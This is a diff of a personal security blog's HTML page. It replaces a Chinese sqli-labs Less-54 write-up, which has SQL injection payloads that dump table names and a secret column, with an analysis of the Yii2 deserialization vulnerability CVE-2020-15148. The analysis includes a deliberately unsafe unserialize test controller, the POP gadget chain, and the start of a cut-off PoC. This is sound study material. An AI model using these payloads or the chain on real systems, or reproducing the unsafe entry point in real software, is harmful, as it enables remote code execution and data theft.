@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://scylamb.github.io/ctf/做题笔记/sqli-labs/sqlilabs_page-4/"/>
+  <link rel="canonical" href="http://scylamb.github.io/yii反序列化分析/"/>
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
@@ -20,23 +20,22 @@
   <meta content="Scylamb&#39;s Blog" name="apple-mobile-web-app-title">
   <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
   <meta content="telephone=no" name="format-detection">
-  <link rel="preload" href="/css/style.css?time=1629383072887" as="style">
+  <link rel="preload" href="/css/style.css?time=1632838606449" as="style">
   <!-- 页面元数据 -->
-  <title>sqlilabs_Page-4 - Scylamb's Blog</title>
-  <meta name="keywords" content="sqlilabs_Page-4,aaa">
-  <meta name="description" content="sqli_labs_Page-4前言之前没坚持做完sqlilabs，这次来填坑 参考：国光    sqlilabs注入天书 注：大量复制原文，因为这两篇写的很好了，不重复造轮子了 0x35 less-54   请求方式 注入类型 拼接方式    GET 联合、布尔盲注、延时盲注 id&#x3D;&#39;$id&#39;   简单源码分析： 123456789101112131415161718192021">
+  <title>Scylamb's Blog</title>
+  <meta name="keywords" content="aaa">
+  <meta name="description" content="CVE-2020-15148 Yii反序列化漏洞 官网2.0.38提交说明 官网修复说明 搭建环境&lt;2.0.38 下载2.0.37 我下载了yii-basic-app-2.0.37.tgz 下载到本地后解压，修改config&#x2F;web.php文件里cookieValidationKey的值  新建config&#x2F;controllers&#x2F;TestControllers.php添加一个反序列化的入口">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqlilabs_Page-4">
-<meta property="og:url" content="http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/index.html">
+<meta property="og:title" content="Scylamb&#39;s Blog">
+<meta property="og:url" content="http://scylamb.github.io/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Scylamb&#39;s Blog">
-<meta property="og:description" content="sqli_labs_Page-4前言之前没坚持做完sqlilabs，这次来填坑 参考：国光    sqlilabs注入天书 注：大量复制原文，因为这两篇写的很好了，不重复造轮子了 0x35 less-54   请求方式 注入类型 拼接方式    GET 联合、布尔盲注、延时盲注 id&#x3D;&#39;$id&#39;   简单源码分析： 123456789101112131415161718192021">
+<meta property="og:description" content="CVE-2020-15148 Yii反序列化漏洞 官网2.0.38提交说明 官网修复说明 搭建环境&lt;2.0.38 下载2.0.37 我下载了yii-basic-app-2.0.37.tgz 下载到本地后解压，修改config&#x2F;web.php文件里cookieValidationKey的值  新建config&#x2F;controllers&#x2F;TestControllers.php添加一个反序列化的入口">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2021-04-03T01:25:00.000Z">
-<meta property="article:modified_time" content="2021-04-14T01:36:44.646Z">
+<meta property="article:published_time" content="2021-09-28T14:10:04.555Z">
+<meta property="article:modified_time" content="2021-09-02T03:05:23.386Z">
 <meta property="article:author" content="ScyLamb">
-<meta property="article:tag" content="sqlilabs">
-<meta property="article:tag" content="做题笔记">
+<meta property="article:tag" content="aaa">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png">
   <!-- feed -->
@@ -2149,8 +2148,8 @@ ul.list-v >li>a:hover {
 }
 
   </style>
-  <link rel="stylesheet" href="/css/style.css?time=1629383072887" media="print" onload="this.media='all';this.onload=null">
-  <noscript><link rel="stylesheet" href="/css/style.css?time=1629383072887"></noscript>
+  <link rel="stylesheet" href="/css/style.css?time=1632838606449" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css?time=1632838606449"></noscript>
     <script>
       var userColorScheme=localStorage.getItem("user-color-scheme")
       if(userColorScheme){
@@ -2214,7 +2213,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <!-- Custom Files head end-->
 </head>
   <body>
-    <header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+    <header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2506,7 +2505,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper post search' style="display: ;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture"></div>
 
@@ -2586,287 +2585,135 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
     
-      <h1 class="title">
-        sqlilabs_Page-4
-      </h1>
-      <div class='new-meta-box'>
-        
-          
-            
-<div class='new-meta-item author'>
-  <a class='author' href="/" rel="nofollow">
-    <img no-lazy src="">
-    <p>ScyLamb</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  <div class='new-meta-item category'>
-    <a class='notlink'>
-      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <a class="category-link" href="/categories/ctf/">ctf</a>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Apr 3, 2021</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  <div class="new-meta-item browse leancloud">
-    <a class='notlink'>
-      
-      <div id="lc-pv" data-title="sqlilabs_Page-4" data-path="/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/">
-        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
-        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
-        次浏览
-      </div>
-    </a>
-  </div>
-
-
-          
-        
-        <!-- Custom Files topMeta begin-->
-        
-        <!-- Custom Files topMeta end-->
-      </div>
-    
   </div>
 
 
   <div id="page-plugins-helper"></div>
-  <h1 id="sqli-labs-Page-4"><a href="#sqli-labs-Page-4" class="headerlink" title="sqli_labs_Page-4"></a>sqli_labs_Page-4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><div class="story post-story"><p>之前没坚持做完sqlilabs，这次来填坑</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光</a>    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/category/846064.html">sqlilabs注入天书</a></p>
-<p><strong>注：大量复制原文，因为这两篇写的很好了，不重复造轮子了</strong></p>
-</div><h2 id="0x35-less-54"><a href="#0x35-less-54" class="headerlink" title="0x35 less-54"></a>0x35 less-54</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">联合、布尔盲注、延时盲注</td>
-<td align="left"><code>id=&#39;$id&#39;</code></td>
-</tr>
-</tbody></table>
-<p>简单源码分析：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> reset:</span><br><span class="line">    <span class="comment"># 根据时间戳生成 cookie</span></span><br><span class="line">    setcookie(<span class="string">&#x27;challenge&#x27;</span>, <span class="string">&#x27; &#x27;</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> cookie 中有 challenge:</span><br><span class="line">        <span class="variable">$sessid</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 生成 cookie </span></span><br><span class="line">        <span class="variable">$expire</span> = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">        <span class="variable">$hash</span> = data(<span class="variable">$table</span>,<span class="variable">$col</span>);</span><br><span class="line">        setcookie(<span class="string">&quot;challenge&quot;</span>, <span class="variable">$hash</span>, <span class="variable">$expire</span>);</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">        计数器 + <span class="number">1</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> 有查询成功:</span><br><span class="line">        输出查询信息</span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">        啥都不输出</span><br><span class="line"></span><br><span class="line"><span class="comment"># key 被双重过滤了</span></span><br><span class="line"><span class="variable">$key</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line"><span class="variable">$key</span> = mysql_real_escape_string(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT 1 FROM <span class="subst">$table</span> WHERE <span class="subst">$col1</span>= &#x27;<span class="subst">$key</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>没啥特别的，就限制10次注入<br>Payload：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> order by <span class="number">3</span>--+</span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; order by 4--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> --+</span><br><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database()))--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,(select secret_2RNP <span class="keyword">from</span> lrup8qqcs3 )</span><br></pre></td></tr></table></figure>
+  <p>CVE-2020-15148 Yii反序列化漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">官网2.0.38提交说明</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/security/advisories/GHSA-699q-wcff-g9mj">官网修复说明</a></p>
+<h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p>&lt;2.0.38</p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">2.0.37</a></p>
+<p>我下载了<a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz">yii-basic-app-2.0.37.tgz</a></p>
+<p>下载到本地后解压，修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值</p>
+<p><img src=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202126193.png" class="lazyload" data-srcset=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202126193.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424202126193"></p>
+<p>新建<code>config/controllers/TestControllers.php</code>添加一个反序列化的入口代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = Yii::<span class="variable">$app</span>-&gt;request-&gt;get(<span class="string">&#x27;unserialize&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$name</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cd到根目录，<code>php yii serve --port=8888</code>,指定到8888端口运行[不指定则8080]</p>
+<p>访问：<code>http://localhost:8888/index.php?r=test/test&amp;unserialize=czoxMToiU2N5TGFtYlRlc3QiOw%3d%3d</code></p>
+<p><img src=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202519021.png" class="lazyload" data-srcset=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202519021.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424202519021"></p>
+<p>即为成功搭建测试环境</p>
+<p><a target="_blank" rel="noopener" href="https://www.yiiframework.com/doc/guide/2.0/zh-cn/runtime-routing">Yii路由</a></p>
+<h4 id="BatchQueryResult起点"><a href="#BatchQueryResult起点" class="headerlink" title="BatchQueryResult起点"></a>BatchQueryResult起点</h4><p><img src=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/t018f135305b9f577ab.png" class="lazyload" data-srcset=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/t018f135305b9f577ab.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>
+<p>从官方披露的修改，可知反序列化的起点是 <code>yii/db/BatchQueryResult</code>中的__destruct()</p>
+<blockquote>
+<p>上图就是与cve-2020-15148相关的所有更新，可以看到就只是在yii\db\BatchQueryResult类里添加了一个__wakeup方法，有些朋友可能不太了解这个方法</p>
+<p>__wakeup方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当BatchQueryResult类被反序列化时就直接报错，避免反序列化的发生，也就避免了漏洞</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// make sure cursor is closed</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;reset();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_dataReader !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_dataReader-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_dataReader = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_batch = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_key = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见<code>__destruct()</code>函数调用了<code>reset()</code>方法，<code>reset()</code>方法中的<code>_dataReader</code>参数是可控的，并且调用了该参数的<code>close()</code>函数</p>
+<p>那么这里就可以作为跳板，去执行其他函数的<code>__call()</code></p>
+<p>全局搜索<code>__call</code>,出现了很多结果，但是最好利用的一个是<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code>,它的<code>__call</code>方法是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进format:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>出现了<a target="_blank" rel="noopener" href="https://php.golaravel.com/function.call-user-func-array.html">call_user_func_array</a>()，继续跟进 getFormatter()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>目前<code>$formatter=&#39;close&#39;</code>,<code>$arguments</code>为空。<code>$formatter</code>传入了<code>$this-&gt;getFormatter</code>,在这个方法中，<code>$this-&gt;formatters</code>是可控的，这也就意味着<code>getFormatter</code>方法的返回值是可控的。</p>
+<p>也就是说<code>call_user_func_array</code>这个函数的第一个参数可控，第二个参数为空,所以我们这里可以调用任意类中的任意不带参数的方法了</p>
+<p>寻找可以实现任意代码执行或者间接实现任意代码执行的任意一个方法，并且参数是类的成员变量</p>
+<p>直接构造正则表达式搜索 <code>call_user_func_array</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">高级正则：</span><br><span class="line">call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</span><br><span class="line"></span><br><span class="line">普通正则：</span><br><span class="line">function \w+\(\) ?\s?\&#123;(.*?\s)+?call_user_func</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>yii\rest\CreateAction::run()</code>和<code>yii\rest\IndexAction::run()</code>这两个方法比较合适</p>
+<p><strong>yii\rest\CreateAction::run()</strong></p>
+<p><code>/vendor/yiisoft/yii2/rest/CreateAction.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CreateAction</span></span>&#123;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">    ......</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">            call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">@var</span> $model \yii\db\ActiveRecord */</span></span><br><span class="line">        <span class="variable">$model</span> = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;modelClass([</span><br><span class="line">            <span class="string">&#x27;scenario&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;scenario,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$model</span>-&gt;load(Yii::<span class="variable">$app</span>-&gt;getRequest()-&gt;getBodyParams(), <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$model</span>-&gt;save()) &#123;</span><br><span class="line">            <span class="variable">$response</span> = Yii::<span class="variable">$app</span>-&gt;getResponse();</span><br><span class="line">            <span class="variable">$response</span>-&gt;setStatusCode(<span class="number">201</span>);</span><br><span class="line">            <span class="variable">$id</span> = implode(<span class="string">&#x27;,&#x27;</span>, array_values(<span class="variable">$model</span>-&gt;getPrimaryKey(<span class="literal">true</span>)));</span><br><span class="line">            <span class="variable">$response</span>-&gt;getHeaders()-&gt;set(<span class="string">&#x27;Location&#x27;</span>, Url::toRoute([<span class="keyword">$this</span>-&gt;viewAction, <span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$id</span>], <span class="literal">true</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="variable">$model</span>-&gt;hasErrors()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServerErrorHttpException(<span class="string">&#x27;Failed to create the object for unknown reason.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$model</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">    ......</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都是直接可控的</p>
+<p>利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\CreateAction::run()</span><br></pre></td></tr></table></figure>
+
+<p>poc1：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 